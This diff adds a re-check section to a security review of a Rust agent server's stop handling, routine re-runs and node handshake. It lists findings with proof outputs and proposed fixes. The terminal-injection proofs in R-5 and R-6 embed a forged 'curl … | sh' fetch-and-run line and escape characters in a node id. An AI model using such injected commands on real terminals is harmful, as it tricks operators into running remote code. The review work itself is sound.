@@ -568,3 +568,421 @@ Every script kills what it started by pid and prints `cleanup killed: …`
 `review_a19` in its command line or working directory, no `sleep 97xxxx` to
 `98xxxx`, no line with `review_a19` or `t8e-stall` in `/proc/self/mountinfo`.
 The owner's server was never signalled and its data directory never opened.
+
+## 7. Re-check, 2026-11-13: the fixes of `859e59c`
+
+Re-checked: the branch at `13b8cde` (`git diff 421f43c..HEAD`: `859e59c` the
+fixes, `5eeca5c` the documents, `13b8cde` a message; `421f43c` is a merge of
+`origin/main` and not the subject). Same machine, same rules, the branch's
+own build (a copy of it). No product or test source changed. The builder's
+tests pass here: `stop_signal` 10 of 10. The proofs of sections 2 to 4 were
+run again; two were rewritten to say what is true now
+(`stop_hang_blocking.py`, `routine_stops.py`), `review_a19_handshake.rs` and
+`review_a19_node_reason.rs` were extended, and six are new
+(`routine_remote.py`, `review_a19_put_back_loop.rs`, `stop_child_race.py`,
+`stop_ends.py`, `uploads_race.py`, `debug_seam.py`). The Rust proofs now keep
+their temporary folders under the target directory (`run_rust_proofs.sh`
+sets `TMPDIR`); in the first round and in the first two runs of this one
+they were made in `/tmp` by `tempfile`, as the suite's own tests make
+theirs, and removed when each test ended.
+
+### 7.1 Status
+
+| Id | Status | What shows it |
+|---|---|---|
+| A19-1 | **Closed**, with the limit the builder states | `stop_hang_blocking.py`: the leader is a zombie, one thread in `D`, until the read returns; the lock cannot be taken; a second `serve` is refused; reaped with 0 once the mount answers. Notes R-9. |
+| A19-2 | **Partly closed.** A run cut by a stop of `serve` is put back, not counted, and runs once at the next start (five stops: failures 0, one run, six chats). "Run now" and webhooks: 503, no run. Four paths still lose or distort a run: **R-1, R-2, R-3, R-4** | `routine_stops.py`, `routine_remote.py`, `review_a19_put_back_loop.rs` |
+| A19-3 | **Closed** for what was tried: a 60 GB sparse file: exit 0 after 61.1 s, `stopped`; a 40 GB one in a git repository (the snapshot succeeds in 58 s, then the copies): exit 0 after 59.0 s. By reading, what follows a snapshot that succeeded late (`pin_turn`, `prune`, a collection's hold, each git call up to 120 s) has the 15 s margin; not made to exceed it. | `stop_bound.py`, `stop_bound.py 40G repo` |
+| A19-4 | **Closed.** 10 of 10 restores racing the node's stop (10 to 56 ms): 503 in 0.1 s, nothing cut. | `restore_race.py 10` |
+| A19-5 | **Closed.** Exit 1, the session named. A panic of the stop task is still read as "nothing left": R-10. | `stop_full_disk.py` |
+| A19-6 | **Partly closed.** The refusal: one line, 148 characters, no ESC; 7 MiB becomes 1635 bytes of stderr. Still raw: the node id a master assigns at `node join`: **R-5**. What `printable` lets through: **R-6**. | `run_rust_proofs.sh reason` |
+| A19-7 | **Closed** (the unit by reading). `node run` and `node join` exit 77 on a refusal; nothing else in `serve` or `node` can (`main` looks for `LinkError::Rejected` in the error's chain; only `node_handshake` makes one). | `run_rust_proofs.sh reason` |
+| A19-8 | **Closed.** The refused message, sent again: 200. Two side effects: R-8. | `stop_window.py`, `uploads_race.py` |
+| N-1 | Open (not claimed fixed): a signal before the handlers are installed still kills. | |
+| N-2 | Open (not claimed fixed), harmless. | |
+| N-3 | **Closed** in the documents: the README now names both leftovers. | reading |
+| N-4 | **Closed.** The field is required; a hello without it is closed without an answer. | `the_fields_shapes` |
+| N-5 | Open by design: a malformed or missing version gets a closed socket and no reason. A node built before the field now gets that too. | `the_fields_shapes` |
+| N-6 | Open (not claimed fixed): the protocol number is still 1. | |
+| N-7 | **Partly closed.** Cancel then stop: `cancelled`. A completed turn in its checkpoint: `completed`. A sub-agent being started when the stop comes ends `cancelled`: **R-7**. | `stop_ends.py`, `stop_child_race.py` |
+| N-8 | **Closed** (`biased`, the cancel first). Raced again: section 7.3. | `stop_race.py approvals` |
+| N-9 | **Closed** for the join (refused with the reason, token unspent) and for sub-agents (refused; but see R-7). `set_agent` and `select_variant` still append while stopping, judged harmless by the builder; I agree. The join's check is an oracle for a token: R-11. | `what_a_join_of_another_protocol_tells_about_its_token` |
+| N-10 | Open (not claimed fixed); one more WARN, for a refused join with a valid token. | |
+| N-11 | **Mostly closed**: tests now reach the bound (through the debug seam), the stuck thread, the node's second signal, the link down, the join. None for R-1 to R-4. | |
+| N-12 | **Closed** except the three sentences R-1 to R-3 make untrue, and R-9. | |
+
+### 7.2 New findings
+
+#### R-1. Medium (claim 4; made by the fix). A put-back run of a webhook is run again without its event
+
+**Mechanism.** Both relaunch paths call `spawn_execute(m, run_id, None)`
+(`runner.rs:1251`, `:1272`). `admit` takes the event only from that
+argument; the copy on the run's row (`routine_runs.event`) is not read. The
+prompt is rendered again with no event: every `{{event.…}}` is empty
+(`on_missing = empty`, the default) or the run is `skipped`
+(`on_missing = skip`); the run is no longer marked untrusted; the source's
+consent check in `admit` is skipped.
+
+**Reproduction.** `python3 routine_stops.py webhook` (a webhook routine
+"… Handle this ticket: {{event.text}}", one call, one SIGTERM of `serve`
+while its turn runs, one start):
+
+```
+before the stop: status running, untrusted True, prompt 'slow: twenty words. Handle this ticket: TICKET-4711 refund the customer'
+exit status 0
+after the next start: status completed, reason None, untrusted False, prompt 'slow: twenty words. Handle this ticket: '
+the stored event of the run is still on its row: "{'text': 'TICKET-4711 refund the customer', 'received_at': '2026-11-12 23:51', '"
+what the new chat's turn was asked: ['slow: twenty words. Handle this ticket: ']; ends ['completed']
+runs listed: 1
+```
+
+The run is shown completed. The agent was asked to handle nothing, with the
+routine's tools and approval mode. On `5add735` the run was `interrupted`,
+which was honest.
+
+**Smallest fix.** The relaunch loads the row's stored event and passes it
+(it is the event cut to 16 KiB, so say so in the run's warnings when it was
+cut), keeping `untrusted` and the consent check; or a run with a stored
+event is not put back but ended `interrupted` without being counted.
+
+**Test.** `hooks_http.rs`: a webhook run with `{{event.text}}`, its turn
+ended `stopped`, the next start: the new chat's prompt holds the text and
+the run is untrusted.
+
+#### R-2. Low (claim 4). A node stopped, then its master: the run is `interrupted` and counted
+
+**Mechanism.** A remote node's stop ends the turn `stopped`; the master is
+not stopping, so `put_back` relaunches at once; the node is still stopping
+(or gone), so the launch falls to `retry_later`, which overwrites the
+put-back's reason and keeps the retry in memory. A stop of the master inside
+that minute (5 and 15 for the next ones) loses it; the next start finds a
+`pending` run without the put-back reason and ends it.
+
+**Reproduction.** `python3 routine_remote.py both` (a real `node run`, an
+agentic routine on it):
+
+```
+the run is running on the remote node: (('running', 1, None), (0, None))
+the node is stopped: exit status 0
+the master's row for the run now: (('pending', 2, 'this node is stopping (…): send this again once it is back; trying again in 1 min'), (0, None))
+the master is stopped: exit status 0
+both are back: (('interrupted', 2, 'the server restarted before the run started'), (1, None))
+```
+
+The second pair is the routine's `consecutive_failures, paused_reason`.
+Control, `routine_remote.py node` (only the node is restarted): after the
+minute the run is `running` again, attempt 2, failures 0. By reading, a
+node away for more than the three retries (21 min), or a routine whose next
+occurrence comes before the retry, ends the run `failed`, also counted: the
+absent node's rule, which `docs/routines.md` names, but "is no failure and
+is not counted" is said without it.
+
+**Smallest fix.** `retry_later` keeps the put-back mark (a column, not the
+reason's text) and the start-up reconcile launches every `pending` run that
+carries it; a put-back run that runs out of retries is not counted.
+
+**Test.** `routines_http.rs` with a fake remote node: stopped end, refused
+relaunch, `begin_stop`, next start: the run is launched, failures 0.
+
+#### R-3. Low (claim 4). A stop in the moment a run is launched: `interrupted` and counted
+
+**Mechanism.** `launch` writes the row `running` with its chat, then sends
+the prompt. With no turn running anywhere the stop returns at once, HTTP
+ends, `main` gives the runtime 2 s in which tasks are dropped, and the
+launch's own bookkeeping (the refusal's `put_back`, or the `stopped` end's)
+never runs. The next start's `reconcile_run` finds a chat with no turn and
+ends the run "the run's turn stopped without finishing" (`runner.rs:1364`).
+
+**Reproduction.** `python3 routine_stops.py launch` ("run now", SIGTERM as
+soon as the row reads `running`):
+
+```
+SIGTERM in the moment the run's row first says `running`, 8 tries:
+  8: exit 0; at rest: running+chat; after the next start: interrupted (the run's turn stopped without finishing); failures 1
+```
+
+The window is the prompt's way to the node (tens of milliseconds here). A
+schedule and a restart on the same minute meet in it. The relaunch after a
+put-back passed the same test when stopped again 0 to 400 ms after the
+start listened (`routine_stops.py window`: 11 of 11 `pending` at rest,
+`completed` after one more start), so the window is the launch's, not the
+reconcile's.
+
+**Smallest fix.** At start, a `running` run whose chat holds no
+`turn_started` was never run: put it back instead of ending it. Or the stop
+waits for launches in flight as it waits for turns.
+
+**Test.** `routines_http.rs`: `begin_stop` between the row's `running` and
+the prompt's ack; the next start completes the run, failures 0.
+
+#### R-4. Low (T7; made by the fix). A node that ends every turn `stopped` is given the same run for ever
+
+**Mechanism.** `put_back` relaunches at once when the master is not
+stopping, does not raise `attempt`, and is not counted. Nothing bounds it:
+not the retries, not the daily cap (one run), not the failure counter.
+
+**Reproduction.** `sh run_rust_proofs.sh loop` (a protocol-level node that
+acks every command and ends each turn `stopped`; one "run now"):
+
+```
+after 1 s: prompts sent for the one run: 512; chats made: 513; the run: "pending" attempt 1; runs listed: 1
+after 3 s: prompts sent for the one run: 1465; chats made: 1465; the run: "pending" attempt 1; runs listed: 1
+after 5 s: prompts sent for the one run: 2332; chats made: 2332; the run: "running" attempt 1; runs listed: 1
+the routine: paused_reason null
+2335 launches of one run in 5 s; nothing counted, nothing stops it
+```
+
+Each launch is a new chat in the owner's list and in the master's store,
+about 470 a second here, until someone deletes the routine or revokes the
+node. A registered node only (hostile, or with a bug in how it ends turns).
+
+**Smallest fix.** `put_back` raises `attempt` and gives up after a few
+(ending the run `interrupted`, counted then), and a relaunch that is not at
+start-up goes through `retry_later`'s delays instead of at once.
+
+**Test.** This proof with a bound: at most N prompts.
+
+#### R-5. Low (A19-6, the part left). `node join` prints the node id its master assigns raw, and `node run` prints it again at every start
+
+**Mechanism.** `printable` was put on the refusal and on the id logged at
+"connected to master" (`client.rs:121`). `client::join` returns the id as
+received; `node_join` prints it (`main.rs:772`) and writes it to
+`remote.toml`, from where `node run` prints it ("node `…` connecting to").
+
+**Reproduction.** `sh run_rust_proofs.sh reason` (a stand-in master, the
+real `node join`):
+
+```
+node join: exit status Some(0) after 62.043117ms; stdout and stderr, escaped:
+    joined as node `box\u{1b}[2J\u{1b}[H\n
+    joined. Now run: curl https://example.invalid/fix | sh\n
+    `. Start it with: rizzy-harness node run\n
+ESC bytes written raw: 2
+an id of 1 MiB: exit status Some(0), 1048731 bytes printed
+```
+
+**Smallest fix.** The node accepts an id only in the shape the master
+itself requires (`plausible_node_id`: 1 to 64 of `a-z0-9-`) at join and at
+`accepted`, and refuses anything else.
+
+**Test.** This proof with asserts.
+
+#### R-6. Note (A19-6). What `printable` lets through
+
+`char::is_control` is category Cc only. The same proof with a reason that
+holds U+2028, U+2029, U+202E, U+200B and a run of spaces:
+
+```
+  U+2028 reaches the node's stderr: true
+  U+2029 reaches the node's stderr: true
+  U+202E reaches the node's stderr: true
+  U+200B reaches the node's stderr: true
+  as an 80-column terminal shows the last line:
+    |Error: the master refused this node: x                                          |
+    |2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update verified; run: curl http|
+    |s://example.invalid/fix | sh\u{2028}second\u{2029}third \u{202e}desrever\u{202c} a\u{200b}b|
+```
+
+No terminal I know breaks a line at U+2028; log viewers and JavaScript do.
+A right-to-left override reorders what follows it on a terminal that does
+bidirectional text. Spaces alone put a forged text at the start of a row.
+The master's own reasons are ASCII: keep `' '..='~'`, fold runs of spaces
+into one.
+
+#### R-7. Note (N-7, N-9). A sub-agent being started when the stop comes starts its turn after the stop and ends `cancelled`
+
+`run_child` checks the flag first, then makes the child's folder (a git
+worktree), then claims the turn. A stop in between marks and cancels the
+parent; the child claims with a token already cancelled, so `mark_stopped`
+leaves it. `python3 stop_child_race.py`:
+
+```
+SIGTERM d ms after the parent's `delegate` call started:
+  child: started 1, ends ['cancelled']; parent: started 1, ends ['stopped']
+      at 0 ms, 0 ms, 5 ms, 5 ms, 10 ms, 10 ms, 20 ms, 20 ms, 40 ms, 40 ms, 80 ms, 80 ms
+  child: started 1, ends ['stopped']; parent: started 1, ends ['stopped']
+      at 150 ms, 150 ms, 300 ms, 300 ms
+```
+
+Every exit 0, both turns closed once. Fix: check the flag again after the
+child's claim, as `prompt` does, and refuse.
+
+#### R-8. Note (A19-8's fix). The put-back of uploads
+
+`python3 uploads_race.py`. (a) `attachments_give_back` does not look at the
+limit: a user at 20 unsent uploads, a refused message that takes five,
+five new uploads while the node is asked: `unsent uploads held after 12
+refused messages: 25 (the limit is 20)`; several refused messages at once
+would take more. (b) It writes the sender as owner: the API token's refused
+message with a user's upload `left it owned by None`, and `alex then sends
+it: 400 'unknown or already used attachment; upload it again'` (before the
+fix the upload was gone; now it is there and not theirs). (c) Sent and kept:
+`of 10 tries, an upload both sent and still held: 0`; an upload put back
+gets a new age and is purged by it. Fix: return the original owner from
+`attachments_take` and give it back to them.
+
+#### R-9. Note (A19-1's limit). What the kept process looks like
+
+In the state the builder describes, `stop_hang_blocking.py`:
+
+```
+exit status 8 s later: None (None: not reaped), process state 'Z', threads ['2914070[Z]', '2914425[D]']
+the data directory's lock can be taken by someone else now: False
+the lock file's hint: '2914070 serve' (the process: pid 2914070)
+after one more SIGKILL: exit status None, state 'Z'
+a second `serve` is refused: <run>/hang/data is in use by serve (pid 2914070): one data directory serves one process; stop that one first, or give this one its own --data-dir
+doctor: ok    data dir lock: held by serve (pid 2914070): a second server or node on this directory is refused
+the mount is released: the process is reaped with exit status 0; the lock is free: True
+```
+
+The thread is dead to user space (it never returns from the kernel), so
+nothing writes after the exit. The messages tell the operator to stop a
+process nothing can stop; neither says it is a zombie waiting on a mount.
+The README's "the process exits 2 s after its work is done whatever threads
+remain" is not what a supervisor sees: the main process is not reaped until
+the read returns, so (by reading, systemd not run) `systemctl stop` waits
+its 120 s, the unit ends failed with the process left, and each start until
+the mount answers is refused by the lock. By reading: a panic of
+`async_main` unwinds through a plain drop of the runtime, which waits for
+the stuck thread with the lock held (the old hang, without the double
+start); SIGKILL then gives the state above.
+
+#### R-10. Note. A stop task that dies is read as "every turn is closed"
+
+`serve` takes the stop's result with `stopped_rx.await.unwrap_or_default()`
+(`main.rs:491`). `python3 debug_seam.py` reaches it through the debug
+build's variable (`Instant + Duration` overflows):
+
+```
+HARNESS_STOP_WAIT_S unset: exit status 0 in 2.6 s; the turn at the next start: ['stopped']
+HARNESS_STOP_WAIT_S = 0: exit status 1 in 0.3 s; the turn at the next start: ['interrupted']
+HARNESS_STOP_WAIT_S = 18446744073709551615: exit status 0 in 0.4 s; the turn at the next start: ['interrupted']
+    thread 'tokio-rt-worker' panicked at …/tokio-1.54.1/src/time/instant.rs:161:27:
+    last line: stopped: every turn is closed
+HARNESS_STOP_WAIT_S = 0 (in .env): exit status 1 in 0.3 s; the turn at the next start: ['interrupted']
+```
+
+The variable is read only under `#[cfg(debug_assertions)]`
+(`stop.rs:50-58`); the image is built with `--release`, no profile turns
+debug assertions on there, CI builds only tests. A release build was not
+made here. A debug build (`cargo run`, `target/debug/rizzy-harness`) takes
+it from the environment and from `.env` in the folder `serve` starts in.
+Fix: a closed channel is exit 1 ("the stop did not finish"); cap the
+variable.
+
+#### R-11. Note (N-9's fix). The join's version check tells whether a token is valid without spending it
+
+`what_a_join_of_another_protocol_tells_about_its_token`:
+
+```
+the valid token, another protocol, 30 times: rejected "this node speaks protocol 2 and the master (rizzy-harness 0.1.0) protocol 1: …"  (median 41.99 ms)
+a wrong token, another protocol, 30 times: rejected "invalid or expired join token"  (median 42.02 ms)
+the valid token, another protocol, a bad signature: rejected "bad signature"
+after 30 refused joins, the valid token with the master's protocol: accepted
+the same token again (now spent), another protocol: rejected "invalid or expired join token"
+```
+
+As designed: the token is untouched and only its holder learns the version.
+It is also a test of a token that leaves no audit row and does not use it
+up (a join with the right protocol tells the same by spending it). Tokens
+are 32 characters; guessing is not the risk. No timing difference.
+
+### 7.3 Attacks that held
+
+- **The lock on every exit** (reading, and `stop_hang_blocking.py`,
+  `stop_bound.py`, `signals.py second`): taken in `main` before the runtime,
+  never dropped; a clean stop, the bound, an error from `async_main` and the
+  second signal all end in `process::exit` with it held. `doctor`, `token`,
+  `claim-code`, `graphify` take none, as before.
+- **Twice or never, the put-back at start** (`routine_stops.py`): five
+  stops in a row: `('pending', "the node was stopped while the run's turn
+  ran; …", None)` at rest each time, failures 0, 1 run listed, then
+  `completed`; six chats, each with one turn (five `stopped`, one
+  `completed`). The next start stopped again 0 to 400 ms after it listened:
+  11 of 11 `completed` after one more start, failures 0. The relaunch goes
+  through `admit` again (the owner's account, membership, permission, the
+  node's grant, the caps); by reading it does not look at `paused_reason` or
+  `enabled`, so a routine paused meanwhile still runs its put-back run.
+  `RunPatch` is built only in `runner.rs`; no HTTP body reaches
+  `clear_chat`.
+- **The refusal window again**: `restore_race.py 10`: `{'refused': 10}`;
+  `stop_window.py`: prompt, session, restore 503, `allow` 409, the
+  attachment sent again 200; `stop_users_routines.py`: 24 answers to another
+  user, 0 differ; run now 503 and no run after the next start.
+- **Races** (`stop_race.py`): 30 `allow` answers sent 0 to 3 ms before the
+  signal: 23 recorded `allow by user` (each stamped within a millisecond of
+  the stop's log line, some just after it: decided before the cancel
+  reached the turn), 7 answered 409 and `deny by cancelled`; the command ran
+  in 0 of 30, every end `stopped`, every exit 0. 96 prompts sent 150 ms
+  before to 20 ms after the signal: 9 answered 200 and ended `stopped`, 87
+  answered 503 with nothing recorded; `violations: 0`.
+- **Each kind of turn, the second signal, the link down, commands that
+  resist** (`stop_kinds.py`, `signals.py second`, `node_link.py`,
+  `stop_commands.py term detach stuck`): as in section 4, line for line
+  (model call, sub-agent, approval, chat, shell: `stopped` once, nothing
+  added by the next start; exit 1 in 3 ms and `interrupted` once; the end
+  replayed once; nothing alive after exit 0 except the stuck command's
+  guard).
+- **Which end** (`stop_ends.py`): the person's cancel, then SIGTERM 0.2 s
+  later: `['cancelled']`; SIGTERM, then the cancel: `['stopped']`; SIGTERM
+  while a finished turn's checkpoint runs (the model's last message is
+  seq 10, the end not yet written): exit 0 after 22.0 s, `['completed']`.
+- **The handshake** (`run_rust_proofs.sh handshake`): the table of section
+  4 with one change (no version: closed, for everyone); a stranger's
+  refusal: medians 41.99, 42.00, 42.17 ms for claims 1, 99, 0; the live link
+  untouched by two refused handshakes; a lying `node.hello` not listed.
+- **Exit 77**: `node run` refused: `exit status Some(77)`; `node join`
+  refused (a stand-in master): `a refused join: exit status Some(77); it
+  prints: Error: the master refused this node: this node speaks protocol 1
+  and the master (rizzy-harness 9.9.9) protocol 2: …`. A node whose key is
+  revoked while it runs exits 77 the same way without closing its turns (the
+  link's error returns at once: by reading, as before the change).
+
+### 7.4 Not tested
+
+systemd and Docker (rules). A release build (not made: the seam's `cfg` and
+the Dockerfile were read). A file-changing sub-agent's shell under a stop
+(its command is refused here: "would expose the harness's data directory",
+so `merge_back` under a stop was not reached). A stop past 80 s without the
+seam. R-9's panic path and the pause of a routine before its relaunch
+(reading).
+
+### 7.5 Verdict per claim, again
+
+1. **Holds**, on the wire and now on the node's terminal for a refusal;
+   `node join` still prints a master's text raw (R-5). The unit leaves a
+   refused node down.
+2. **Holds.** A19-1, A19-3, A19-4, A19-5 and A19-8 are closed. What is left
+   is small: a sub-agent's turn started and ended `cancelled` across the
+   stop (R-7), a dead stop task read as success (R-10).
+3. **Holds**: the lock goes with the process, also when the process cannot
+   go (R-9 says what that looks like).
+4. **Holds for the plain case only** (a schedule's run on the server's own
+   runtime, cut by the server's stop). A webhook's run is run again without
+   its event (R-1); node then master, and a stop at the launch, still end
+   the run `interrupted` and count it (R-2, R-3); a node can have one run
+   launched without end (R-4).
+5. **Holds as reasoned**: 80 s + 2 s + 0.2 s + 2 s under 120 s for a node;
+   80 s + 2 s + 30 s + 2 s under 150 s for the image;
+   `RestartPreventExitStatus=77` matches the exit. With R-9's process the
+   stop times out. Not run.
+6. **Accurate except three sentences**: "runs again … once the node or the
+   server is back" (R-1 to R-3), "is no failure and is not counted" (R-2,
+   R-3), "the process exits 2 s after its work is done whatever threads
+   remain" (R-9).
+
+Asked for before merge: R-1 (the fix made it). R-4 with it (a counter).
+R-2, R-3 and R-5 are a few lines each and should ride along or be written
+into the documents.
+
+### 7.6 Left clean
+
+As in section 6. After the last run: no process with `review_a19` in its
+command line or working directory, no `review_a19` or `t8e-stall` mount.
+Seven `sleep 975xxx` were alive at that moment; their parents are the
+contained commands of another worktree's `cargo test` (`t8d-…`, started by
+someone else minutes before), not this review's, and they were left alone; the scratch folder is removed; no proof
+copy is left in `crates/*/tests/`. `/tmp` holds about eleven thousand empty
+`.tmp*` folders made at a steady rate since before this review by something
+else on this machine (the newest at 00:37, when no proof of mine was
+running); I did not touch them. The owner's server was only looked at.
